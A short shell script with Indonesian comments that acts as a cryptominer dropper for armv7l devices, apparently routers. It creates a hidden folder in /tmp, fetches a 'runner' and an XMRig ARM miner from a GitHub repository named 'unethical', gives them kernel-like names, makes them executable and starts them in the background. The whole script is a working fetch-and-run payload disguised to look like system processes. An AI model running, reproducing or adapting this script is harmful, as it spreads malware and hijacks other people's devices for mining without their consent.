#!/bin/sh
set -e

REPO_URL="https://github.com/anonking-67/unethical/raw/refs/heads/main"

# PENTING: Gunakan /tmp karena folder ini berjalan di RAM.
# Jika menggunakan $HOME (Flash), memori internal router bisa cepat rusak (limit write cycle).
WORKDIR="/tmp/.kernel-worker"

# Memastikan hanya berjalan di arsitektur armv7l
ARCH=$(uname -m)
if [ "$ARCH" != "armv7l" ]; then
    echo "[-] Error: Script ini khusus untuk armv7l. Arsitektur Anda: $ARCH"
    exit 1
fi

# Bersihkan folder lama jika ada, lalu buat baru
rm -rf "$WORKDIR"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

echo "[+] Menyiapkan lingkungan armv7l di RAM (/tmp)..."

# 1. Download Runner (File Go)
echo "[+] Mendownload runner..."
curl -fsSL -o "runner" "${REPO_URL}/kernel_armv7" || { echo "[-] Gagal download runner"; exit 1; }

# 2. Download Miner (XMRig ARM)
echo "[+] Mendownload miner binary..."
curl -fsSL -o "kernelARM" "${REPO_URL}/kernelARM" || { echo "[-] Gagal download miner"; exit 1; }

# 3. Berikan Izin Eksekusi
chmod +x "runner" "kernelARM"

echo "[+] Memulai Runner (Background)..."
./runner

echo "[+] Misi Sukses. Cek proses dengan perintah: ps | grep kernel"